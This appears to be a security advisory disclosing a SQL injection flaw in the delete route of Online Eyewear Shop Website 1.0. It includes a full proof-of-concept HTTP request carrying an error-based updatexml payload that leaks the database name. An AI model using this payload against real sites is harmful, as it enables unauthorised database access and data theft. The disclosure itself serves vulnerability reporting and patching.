## Online Eyewear Shop Website has a front-end SQL injection vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
/oews/classes/Users.php?f=delete

## Description:
The online eyewear store website 1.0 has a SQL injection attack in the id parameter in the route /oews/classes/Users.php?f=delete. Attackers can exploit this vulnerability to directly obtain sensitive information from the server.

Status: CRITICAL

POC
```
POST /oews/classes/Users.php?f=delete HTTP/1.1
Host: localhost
Content-Length: 53
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/oews/admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=p65p1sp36htfqevfnhij1jvtie
Connection: close

id=1 and updatexml(1,concat(0x7e,(database())),3)-- q
```

Get the database name directly through the error report: oews_db

![CleanShot 2025-03-21 at 16 43 28@2x](https://github.com/user-attachments/assets/8b34f784-8496-44d7-b9f6-ff5b953b2803)


## Code Analysis
The id parameter is controllable and directly introduced into the SQL statement, causing a SQL injection vulnerability.
![CleanShot 2025-03-21 at 16 43 51@2x](https://github.com/user-attachments/assets/0fac71fe-9583-4967-9740-8ac0853d5c7a)


